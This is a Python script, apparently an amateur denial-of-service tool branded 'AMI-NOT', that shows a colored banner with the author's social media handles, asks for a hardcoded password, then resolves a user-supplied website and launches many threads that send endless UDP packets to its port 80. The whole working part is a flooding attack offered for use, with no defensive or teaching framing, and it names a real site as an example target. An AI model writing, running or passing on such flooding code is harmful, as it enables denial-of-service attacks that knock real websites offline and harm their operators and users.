#Noob Editors
#Posy you mother Editor
from colorama import init, Fore
init()
from random import choice, randint
print("                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ")
print("AMI-NOT")
print(Fore.RED+'                   ●○●○●○●○●○●○●○●○●○●○●○●')
print(Fore.RED+'                   ○                     ●')
print(Fore.RED+'                   ●                     ○')
print(Fore.RED+'                   ○                     ●')
print(Fore.RED+'                   ●                     ○')
print(Fore.GREEN+'                   》      AMI-NOT      《')
print(Fore.RED+'                   ○                     ●')
print(Fore.RED+'                   ●                     ○')
print(Fore.RED+'                   ○                     ●')
print(Fore.RED+'                   ●○●○●○●○●○●○●○●○●○●○●○●')
print(Fore.BLUE+'■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□')
print(Fore.YELLOW+'         telegram : Mr_AMI_NOT ')
print(Fore.GREEN+'         instagram : me_AMI.NOT')
print(Fore.RED+'         GITHUB : https://github.com/AMI-NOT')
print(Fore.BLUE+'■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□')
print(Fore.WHITE+'           ddoser in site                                                  AMI-NOT   ')
print("                                                                                                                                                                                     ")
print("                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ")


password = input("enter youre pass : ")
while password != ("AMI-NOT-79"):
	print(Fore.RED+'password ×')
	password = input("enter youre pass : ")
print(Fore.GREEN+'pasword☆')

print(Fore.YELLOW+'   for example : rubika.ir')



import time
import socket
import sys
import _thread



site = input("Enter your site url => ")
thread_count = input("Enter your thread => ")
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'virus32'
print(Fore.RED+'UDP target IP:', ip)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(Fore.BLUE+' fore dos  ')
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
